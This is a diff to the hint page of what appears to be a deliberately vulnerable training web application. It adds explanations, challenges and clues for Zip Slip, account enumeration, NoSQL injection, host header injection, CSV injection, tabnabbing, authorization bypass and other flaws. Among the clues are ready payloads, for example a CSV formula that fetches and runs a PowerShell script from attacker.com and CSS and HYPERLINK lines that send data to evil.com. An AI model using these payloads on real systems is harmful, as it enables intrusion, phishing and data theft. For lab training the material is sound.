@@ -1644,15 +1644,29 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                 <span class="severity critical">CRITICAL</span>
                 <div class="vuln-header">
                     <span class="vuln-icon">🗜️</span>
-                    <h2 class="vuln-title">Zip Slip / Path Traversal</h2>
+                    <h2 class="vuln-title">Zip Slip / Path Traversal in Archives</h2>
                 </div>
                 <div class="vuln-description">
-                    Extract archives to arbitrary paths. Overwrite system files.
+                    When extracting zip files, the application should validate where files are being extracted. But what if the zip contains entries like "../../../etc/passwd"? Zip Slip lets you write files ANYWHERE on the system!
                 </div>
                 <div class="hint-box">
-                    /api/extract-zip and /api/assets/* don't validate paths. Use ../../../ to escape directories.
+                    Create a malicious zip file where internal paths contain ../ sequences. When extracted, files escape the extraction directory and land in system folders. You can overwrite config files, plant backdoors, or replace executables.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/extract-zip</span> <span class="endpoint-badge">GET /api/assets/*</span></p>
+                <div class="challenge-box">
+                    Can you read files outside the assets folder using /api/assets/? Try /api/assets/../../server.js or /api/assets/../../../etc/passwd. For zip files, craft an archive where entry names include path traversal sequences.
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/extract-zip</span>
+                <span class="endpoint-badge">GET /api/assets/*</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• URL encode if needed: ..%2F..%2Fserver.js</p>
+                    <p>• Try different depths: ../, ../../, ../../../</p>
+                    <p>• Windows: ..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts</p>
+                    <p>• Create zip with: zip malicious.zip -r ../../../evil.sh</p>
+                    <p>• Overwrite cron jobs, startup scripts, or config files</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1662,12 +1676,26 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Account Enumeration</h2>
                 </div>
                 <div class="vuln-description">
-                    Different responses reveal if accounts exist. Username/email enumeration possible.
+                    Applications shouldn't tell attackers which usernames exist! But many do: "User not found" vs "Invalid password" reveals which accounts are real. This lets attackers build lists of valid targets before attempting password attacks.
                 </div>
                 <div class="hint-box">
-                    /api/forgot-password returns different messages. /api/user-lookup reveals existence. Map all users.
+                    Compare responses carefully. Does "forgot password" say "Email sent" for real users but "User not found" for fake ones? Different response times, messages, or status codes leak information.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/forgot-password</span> <span class="endpoint-badge">GET /api/user-lookup</span></p>
+                <div class="challenge-box">
+                    Can you determine which email addresses have accounts? Try /api/forgot-password with various emails. Note differences in responses. Can you map the entire user base?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/forgot-password</span>
+                <span class="endpoint-badge">GET /api/user-lookup</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Try: admin@null.org vs fake@nonexistent.com</p>
+                    <p>• Compare response messages, status codes, timing</p>
+                    <p>• Login errors: "Invalid user" vs "Invalid password"</p>
+                    <p>• Registration: "Email taken" confirms existence</p>
+                    <p>• Automate to test thousands of email addresses</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1677,12 +1705,26 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">HTML/CSS Injection</h2>
                 </div>
                 <div class="vuln-description">
-                    User input rendered as HTML without encoding. CSS injection changes page appearance.
+                    Not quite XSS, but still dangerous! If you can inject HTML without JavaScript, you can deface pages, create fake login forms, or use CSS to steal data via background images that leak secrets in URLs.
                 </div>
                 <div class="hint-box">
-                    /api/html-inject renders name parameter as HTML. /api/style injects CSS. Try &lt;img src=x onerror=alert(1)&gt;
+                    HTML injection adds visible content: fake messages, phishing forms. CSS injection is sneakier: change appearance, hide content, or extract data using attribute selectors that send secrets to your server.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/html-inject</span> <span class="endpoint-badge">GET /api/style</span></p>
+                <div class="challenge-box">
+                    Can you inject HTML to display a fake message? Try /api/html-inject with HTML tags. For CSS: use /api/style to inject styles. Can you hide the real page and show fake content?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/html-inject</span>
+                <span class="endpoint-badge">GET /api/style</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• HTML: Try <h1>Test</h1> or <marquee>Hacked</marquee></p>
+                    <p>• Fake forms for phishing: <form><input></form></p>
+                    <p>• CSS: body{display:none} hides real content</p>
+                    <p>• CSS exfiltration: input[value^="a"]{background:url(evil.com?char=a)}</p>
+                    <p>• Even without <script>, dangerous for social engineering!</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1692,12 +1734,26 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Content Spoofing</h2>
                 </div>
                 <div class="vuln-description">
-                    Craft fake pages that appear legitimate. Phishing and social engineering attacks.
+                    The URL shows legitimate-site.com but the content is completely fake! Content spoofing lets you craft believable phishing pages that appear from the real site. Users see the correct domain and trust it completely.
                 </div>
                 <div class="hint-box">
-                    /api/spoof renders any message. /api/markup allows dangling markup injection.
+                    If an endpoint reflects user input as page content, you can craft URLs that display fake login forms or error messages. Victim sees real domain + fake content = perfect phishing.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/spoof</span> <span class="endpoint-badge">GET /api/markup</span></p>
+                <div class="challenge-box">
+                    Can you create a fake page on the real domain? Try /api/spoof or /api/markup with HTML that mimics a login page. How convincing can you make it?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/spoof</span>
+                <span class="endpoint-badge">GET /api/markup</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Craft: "Your session expired, please log in"</p>
+                    <p>• Mimic real site styling for believability</p>
+                    <p>• URL shorteners hide long malicious parameters</p>
+                    <p>• Dangling markup: <img src=' captures everything after</p>
+                    <p>• Victims trust it because domain looks legitimate!</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1707,12 +1763,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">NoSQL Injection</h2>
                 </div>
                 <div class="vuln-description">
-                    MongoDB-style query injection. Bypass authentication with $ne, $gt operators.
+                    NoSQL databases like MongoDB use JSON/object queries, not SQL strings. But they're still injectable! Instead of SQL syntax, you inject query operators like $ne (not equal), $gt (greater than), or $where with JavaScript.
                 </div>
                 <div class="hint-box">
-                    /api/nosql-query accepts objects. Try ?password[$ne]=null to bypass password check.
+                    Normal login: {username: "admin", password: "pass123"}. But what if you send {username: "admin", password: {"$ne": null}}? This becomes "password not equal to null" - always true! Auth bypassed.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/nosql-query</span></p>
+                <div class="challenge-box">
+                    Can you bypass authentication without knowing the password? Try password={"$ne": null} or password={"$gt": ""}. Can you log in as any user?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/nosql-query</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• $ne: not equal - {"password": {"$ne": ""}}</p>
+                    <p>• $gt: greater than - {"password": {"$gt": ""}}</p>
+                    <p>• $regex: pattern - {"password": {"$regex": ".*"}}</p>
+                    <p>• $where: JavaScript - {"$where": "this.password.length > 0"}</p>
+                    <p>• URL params: ?password[$ne]=null</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1722,12 +1791,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">HTTP Request Smuggling</h2>
                 </div>
                 <div class="vuln-description">
-                    Content-Length and Transfer-Encoding conflicts. Smuggle requests through proxies.
+                    When frontend and backend servers disagree about where one request ends and another begins, chaos! Content-Length says "100 bytes" but Transfer-Encoding says "chunked". Different servers = different answers = smuggled requests!
                 </div>
                 <div class="hint-box">
-                    /api/smuggle shows headers. Look for CL-TE or TE-CL desync opportunities.
+                    HTTP requests can specify length two ways: Content-Length OR Transfer-Encoding: chunked. If proxy uses one method but backend uses another, you can hide a second request inside the first. Proxy sees 1 request, backend sees 2!
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/smuggle</span></p>
+                <div class="challenge-box">
+                    This is advanced! Try /api/smuggle to see how headers are processed. Research CL-TE (Content-Length vs Transfer-Encoding) desync attacks. Can you poison other users' requests?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/smuggle</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• CL-TE: Front uses Content-Length, back uses Transfer-Encoding</p>
+                    <p>• TE-CL: Opposite - front uses TE, back uses CL</p>
+                    <p>• Smuggle malicious prefix into next user's request</p>
+                    <p>• Can poison cache, hijack requests, bypass auth</p>
+                    <p>• Very complex - study PortSwigger's research</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1737,12 +1819,26 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Host Header Injection</h2>
                 </div>
                 <div class="vuln-description">
-                    Host header used in password reset links. Poison cache, redirect victims.
+                    The Host header tells the server which domain you're visiting. But what if the server TRUSTS this header for building URLs? You could poison password reset links, redirect users, or poison web caches!
                 </div>
                 <div class="hint-box">
-                    /api/reset-link uses req.headers.host. /api/cached-content caches based on Host header.
+                    Password reset emails often contain links built like: "https://" + req.headers.host + "/reset?token=...". If you control the Host header, you control where that link goes! Send Host: evil.com and victim gets reset link to YOUR domain.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/reset-link</span> <span class="endpoint-badge">GET /api/cached-content</span></p>
+                <div class="challenge-box">
+                    Can you hijack password reset tokens? Try curl -H "Host: attacker.com" and check if generated links use your host. Also check /api/cached-content - can you poison cache for other users?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/reset-link</span>
+                <span class="endpoint-badge">GET /api/cached-content</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Try: curl -H "Host: evil.com" /api/reset-link</p>
+                    <p>• Check if generated link uses evil.com</p>
+                    <p>• Cache poisoning: first Host header gets cached</p>
+                    <p>• All visitors get the poisoned response!</p>
+                    <p>• Can steal password reset tokens</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1752,12 +1848,27 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Source Code Disclosure</h2>
                 </div>
                 <div class="vuln-description">
-                    Full server source code accessible. Backup files, .git folders exposed.
+                    The entire server source code is accessible! This is like finding the blueprints AND the keys to a building. You can see every vulnerability, every secret, every database query. Game over for the application.
                 </div>
                 <div class="hint-box">
-                    /api/source returns server.js. /server.js.bak is backup. /.git/HEAD reveals git repo.
+                    Developers sometimes leave backup files (.bak, .old, ~) or expose .git folders. With source code, you can find hardcoded secrets, understand the exact implementation, and craft perfect exploits for other vulnerabilities.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/source</span> <span class="endpoint-badge">GET /server.js.bak</span> <span class="endpoint-badge">GET /.git/HEAD</span></p>
+                <div class="challenge-box">
+                    Can you read the server's source code? Try /api/source, /server.js.bak, or /.git/HEAD. Once you have the code, look for hardcoded passwords, API keys, and logic flaws. What else can you discover?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/source</span>
+                <span class="endpoint-badge">GET /server.js.bak</span>
+                <span class="endpoint-badge">GET /.git/HEAD</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Common backup extensions: .bak, .old, .txt, ~, .swp</p>
+                    <p>• .git folder: /.git/config, /.git/HEAD</p>
+                    <p>• Use source to find: hardcoded keys, SQL queries, auth logic</p>
+                    <p>• .DS_Store (Mac), web.config (IIS), .env files</p>
+                    <p>• With source code, every vuln becomes trivial to exploit</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1767,12 +1878,26 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Environment Variable Exposure</h2>
                 </div>
                 <div class="vuln-description">
-                    All environment variables including secrets exposed via API.
+                    Environment variables store the application's deepest secrets: database passwords, API keys, JWT secrets, AWS credentials. If exposed, attackers get complete system access. This is catastrophic!
                 </div>
                 <div class="hint-box">
-                    /api/env returns process.env. /api/headers leaks server versions. /api/config exposes internal config.
+                    process.env contains EVERYTHING: DATABASE_URL with passwords, JWT_SECRET for forging tokens, AWS_ACCESS_KEY for cloud access. One endpoint exposing this = total compromise.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/env</span> <span class="endpoint-badge">GET /api/headers</span></p>
+                <div class="challenge-box">
+                    Can you access the server's environment variables? Try /api/env or /api/headers. What secrets can you find? Database credentials? API keys? Use these to escalate your access everywhere.
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/env</span>
+                <span class="endpoint-badge">GET /api/headers</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Look for: DATABASE_URL, JWT_SECRET, API_KEY</p>
+                    <p>• AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY = cloud access</p>
+                    <p>• Node.js: process.env exposes everything</p>
+                    <p>• Also check: /api/headers for server software versions</p>
+                    <p>• Use leaked JWT_SECRET to forge any token you want</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1782,12 +1907,26 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">ReDoS (Regex Denial of Service)</h2>
                 </div>
                 <div class="vuln-description">
-                    Catastrophic backtracking regex. Input like "aaaaaaaaaaaa!" causes exponential time.
+                    Regular expressions are patterns like (a+)+ that match text. Some regex patterns have a nasty bug: when given certain inputs, they take EXPONENTIALLY longer to process. Example: the pattern (a+)+ with input "aaaaaaaaaaa!" makes the regex engine try millions of combinations, freezing the server for minutes!
                 </div>
                 <div class="hint-box">
-                    /api/validate-email and /api/regex-dos use unsafe regex. Try long strings with special patterns.
+                    "Catastrophic backtracking" means the regex engine tries every possible way to match, exploding with complexity. Pattern (a+)+ with "aaaa...X" tries: a+=(a), a+=(aa), a+=(aaa), etc. With 20 'a's = millions of attempts!
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/validate-email</span> <span class="endpoint-badge">GET /api/regex-dos</span></p>
+                <div class="challenge-box">
+                    Can you freeze the server? Try sending very long strings with repeated characters to email validation endpoints. How many 'a's does it take before the server becomes unresponsive? What character at the end triggers the backtracking?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/validate-email</span>
+                <span class="endpoint-badge">GET /api/regex-dos</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Try input: "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"</p>
+                    <p>• Vulnerable patterns: (a+)+, (a*)*, (a|a)*, (a|ab)+</p>
+                    <p>• Use timing to detect: request taking 10+ seconds = ReDoS</p>
+                    <p>• Email regex often have nested quantifiers like (.+)+@(.+)+</p>
+                    <p>• The "!" at the end forces all combinations to be tried</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1797,12 +1936,26 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Clickjacking</h2>
                 </div>
                 <div class="vuln-description">
-                    No X-Frame-Options header. Pages can be iframed for clickjacking attacks.
+                    Imagine a website loaded invisibly inside an &lt;iframe&gt; on an attacker's page. The attacker puts fake buttons like "Win $1000!" over the invisible iframe's real "Delete Account" button. When you click the fake button, you actually click the invisible real button underneath! This tricks users into performing actions they never intended.
                 </div>
                 <div class="hint-box">
-                    /api/frame-test explicitly allows framing. Most pages missing X-Frame-Options.
+                    X-Frame-Options header tells browsers "Don't allow this page in an iframe". When missing, attackers can overlay transparent iframes and trick users into clicking hidden buttons for password changes, transfers, deletions.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/frame-test</span></p>
+                <div class="challenge-box">
+                    Can you create a clickjacking attack? Try loading /api/frame-test in an iframe. Make it transparent (opacity: 0.1) and position a fake button underneath. What critical actions can you trick users into performing?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/frame-test</span>
+                <span class="endpoint-badge">MOST PAGES</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Create HTML: &lt;iframe src="target.com/transfer" style="opacity:0.1"&gt;&lt;/iframe&gt;</p>
+                    <p>• Position: absolute; top: 100px to align buttons</p>
+                    <p>• Check headers: missing X-Frame-Options = vulnerable</p>
+                    <p>• Also check Content-Security-Policy: frame-ancestors</p>
+                    <p>• Real attacks: trick users into OAuth approvals, money transfers</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1812,12 +1965,26 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">CSV Injection</h2>
                 </div>
                 <div class="vuln-description">
-                    CSV exports don't escape formulas. =cmd|'/c calc' executes on victim machine.
+                    Excel and spreadsheet programs treat cells starting with = as FORMULAS. If a website exports data to CSV without escaping, attackers can inject =cmd|'/c calc' into their username. When a victim opens the CSV in Excel, the formula EXECUTES on their computer! This can run commands, exfiltrate data, or exploit other spreadsheet features.
                 </div>
                 <div class="hint-box">
-                    /api/export-csv and /api/export/users generate CSV. Inject =cmd|'/c whoami' in username.
+                    CSV = Comma Separated Values (just plain text). Excel sees =, @, +, - as formula starters and EVALUATES them. An attacker sets username to =cmd|'/c whoami' → CSV exports it → victim opens in Excel → command runs on victim's PC!
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/export-csv</span> <span class="endpoint-badge">GET /api/export/users</span></p>
+                <div class="challenge-box">
+                    Can you inject a formula that will execute when the CSV is opened? Try registering with username: =cmd|'/c calc' or =HYPERLINK("http://attacker.com?c="&A1). What data can you exfiltrate from the spreadsheet?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/export-csv</span>
+                <span class="endpoint-badge">GET /api/export/users</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Inject: =cmd|'/c powershell IEX(wget attacker.com/s.ps1)'</p>
+                    <p>• Or: =HYPERLINK("http://evil.com?data="&A1&A2&A3)</p>
+                    <p>• DDE: =cmd|'/c calc'!A0 (Dynamic Data Exchange)</p>
+                    <p>• Characters that trigger formulas: = @ + - | % *</p>
+                    <p>• Real impact: steal entire spreadsheet data, RCE on victim</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1827,12 +1994,26 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Tabnabbing</h2>
                 </div>
                 <div class="vuln-description">
-                    target="_blank" without rel="noopener". New window can access window.opener.
+                    When you click a link with target="_blank", it opens in a NEW TAB. But here's the scary part: the new tab has access to window.opener, which is the ORIGINAL TAB! The new page can use window.opener.location = "http://fake-bank.com" to redirect the original tab to a phishing page while you're distracted reading the new tab.
                 </div>
                 <div class="hint-box">
-                    /api/external-link and /api/opener create vulnerable links. New tab can phish parent page.
+                    Without rel="noopener noreferrer", new tabs inherit a reference to the parent window. Attacker's page in new tab runs: window.opener.location.href = "http://evil.com/fake-login". You switch back to original tab, see a login screen, think you got logged out, and enter your password into attacker's phishing page!
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/external-link</span> <span class="endpoint-badge">GET /api/opener</span></p>
+                <div class="challenge-box">
+                    Can you exploit this? Create a page that, when opened in a new tab, redirects the parent tab to a fake login page. How convincing can you make the phishing page? Test on /api/external-link
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/external-link</span>
+                <span class="endpoint-badge">GET /api/opener</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• In new tab: window.opener.location = "https://evil.com/phish"</p>
+                    <p>• Create convincing fake: copy original site's HTML/CSS</p>
+                    <p>• Attack flow: user clicks link → new tab opens → script redirects original tab → user switches back, sees "login" → enters password</p>
+                    <p>• Fix: always use rel="noopener noreferrer" with target="_blank"</p>
+                    <p>• Check: if (window.opener) { /* can exploit */ }</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1842,12 +2023,26 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">MIME Sniffing / Content Type</h2>
                 </div>
                 <div class="vuln-description">
-                    Wrong Content-Type allows browser to execute scripts. PDF XSS possible.
+                    Servers send Content-Type headers like "text/plain" or "application/pdf" to tell browsers what kind of file it is. But browsers sometimes IGNORE this and "sniff" the content to guess the real type! If HTML with &lt;script&gt; is sent as text/plain, old browsers might detect it looks like HTML and EXECUTE the scripts anyway! This bypasses XSS protections.
                 </div>
                 <div class="hint-box">
-                    /api/download sends HTML as text/plain. /api/generate-pdf doesn't set proper Content-Type.
+                    MIME = file type. Sniffing = browser guessing type by reading content. If /api/download returns HTML but says Content-Type: text/plain, Internet Explorer will sniff, detect HTML, and run the scripts! X-Content-Type-Options: nosniff prevents this.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/download</span> <span class="endpoint-badge">GET /api/generate-pdf</span></p>
+                <div class="challenge-box">
+                    Can you bypass XSS filters using MIME confusion? Try uploading HTML with &lt;script&gt;alert(1)&lt;/script&gt; to endpoints that serve files with wrong Content-Type. Which browsers execute it? Does adding X-Content-Type-Options: nosniff prevent it?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/download</span>
+                <span class="endpoint-badge">GET /api/generate-pdf</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Upload file.txt containing: &lt;html&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</p>
+                    <p>• Server serves it as text/plain but browser sniffs HTML</p>
+                    <p>• Test different browsers: IE is most vulnerable, Chrome/Firefox safer</p>
+                    <p>• Check response headers: missing X-Content-Type-Options = vulnerable</p>
+                    <p>• Real exploit: upload "image.jpg" containing HTML, execute XSS</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1857,12 +2052,26 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Authorization Bypass</h2>
                 </div>
                 <div class="vuln-description">
-                    Admin endpoints check headers not session. X-Admin: true grants full access.
+                    Authorization checks WHO can access WHAT. Bad implementations check things like HTTP headers or URL parameters instead of secure server-side session data. Setting X-Admin: true or ?debug=true tricks the server into thinking you're an administrator! This is like putting a fake "STAFF" badge on your shirt and walking into the back room — shockingly, it sometimes works!
                 </div>
                 <div class="hint-box">
-                    /api/admin-only checks X-Admin header. /api/secure-data checks ?debug=true. Easy bypasses.
+                    Proper auth checks SESSION or JWT tokens. Broken auth checks X-Admin header, ?isAdmin=true param, or Referer header. Attacker just adds these to their request and gains admin access! Always test: what if I add X-Admin: true?
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/admin-only</span> <span class="endpoint-badge">GET /api/secure-data</span></p>
+                <div class="challenge-box">
+                    Can you access admin-only endpoints? Try adding custom headers like X-Admin: true, X-Role: admin, or URL parameters ?debug=true, ?admin=1. What sensitive data or functions can you access?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/admin-only</span>
+                <span class="endpoint-badge">GET /api/secure-data</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Try headers: X-Admin: true, X-Role: admin, X-Original-User: admin</p>
+                    <p>• Try params: ?debug=true, ?admin=1, ?bypass=1, ?test=true</p>
+                    <p>• Check cookies: can you set isAdmin=true cookie?</p>
+                    <p>• Look for: if (req.headers['x-admin'] == 'true') { grantAccess(); }</p>
+                    <p>• Real impact: access admin panel, delete users, view all data</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1872,12 +2081,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Subdomain Takeover</h2>
                 </div>
                 <div class="vuln-description">
-                    CNAME points to unclaimed service. Register that service to take over subdomain.
+                    Subdomains like blog.example.com use DNS CNAME records pointing to services like Heroku or AWS. If the company deletes their Heroku app but FORGETS to remove the DNS record, the CNAME points to an unclaimed service! Attackers can create a new Heroku app with that name and take control of blog.example.com — hosting phishing pages on the legitimate domain!
                 </div>
                 <div class="hint-box">
-                    /api/subdomain-check shows CNAME: old-service-12345.herokuapp.com - UNCLAIMED
+                    DNS lookup shows: blog.example.com CNAME old-app-12345.herokuapp.com. Visiting old-app-12345.herokuapp.com shows "App not found". This means you can register it! Now blog.example.com serves YOUR content on their trusted domain.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/subdomain-check</span></p>
+                <div class="challenge-box">
+                    Can you identify unclaimed subdomains? Check /api/subdomain-check for CNAME records. If you find "app-12345.herokuapp.com" that doesn't exist, what could you do? How would this help with phishing attacks?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/subdomain-check</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Check DNS: dig blog.example.com → shows CNAME</p>
+                    <p>• Visit CNAME target: if 404 or "Not Found" = potentially claimable</p>
+                    <p>• Vulnerable services: Heroku, AWS S3, GitHub Pages, Azure</p>
+                    <p>• Claim it: create account, register that specific name</p>
+                    <p>• Impact: host phishing on legitimate domain, steal cookies/sessions</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1887,12 +2109,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">HTTP Verb Tampering</h2>
                 </div>
                 <div class="vuln-description">
-                    Endpoints respond to unexpected HTTP methods. DELETE as GET, POST as HEAD.
+                    HTTP requests use "verbs" (methods) like GET, POST, DELETE, PUT. Security controls might only protect POST /api/admin-delete but forget about GET /api/admin-delete! By changing the verb from POST to GET (or HEAD, OPTIONS, TRACE), you might bypass authentication or CSRF protections. It's like a door locked for "pushing" but anyone can "pull" it open.
                 </div>
                 <div class="hint-box">
-                    /api/admin-delete accepts GET instead of DELETE. Try changing request methods.
+                    Framework routing often has bugs: app.post('/delete', checkAuth) protects POST, but app.all('/delete') or forgotten app.get('/delete') allows unauthorized access! Also, DELETE as GET turns dangerous actions into clickable links.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">ALL /api/admin-delete</span></p>
+                <div class="challenge-box">
+                    Can you access /api/admin-delete using GET instead of DELETE? What about using HEAD or OPTIONS? Try changing the HTTP method on protected endpoints. Which security checks can you bypass?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">ALL /api/admin-delete</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Try: GET /api/admin-delete when it expects DELETE</p>
+                    <p>• Try: POST /api/view-data when it expects GET</p>
+                    <p>• Try: HEAD request (like GET but no body returned)</p>
+                    <p>• Try: OPTIONS to discover allowed methods</p>
+                    <p>• Impact: bypass CSRF tokens (GET has no body), bypass auth checks</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1902,12 +2137,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Memory Leaks</h2>
                 </div>
                 <div class="vuln-description">
-                    Unbounded arrays grow indefinitely. Repeated requests cause memory exhaustion.
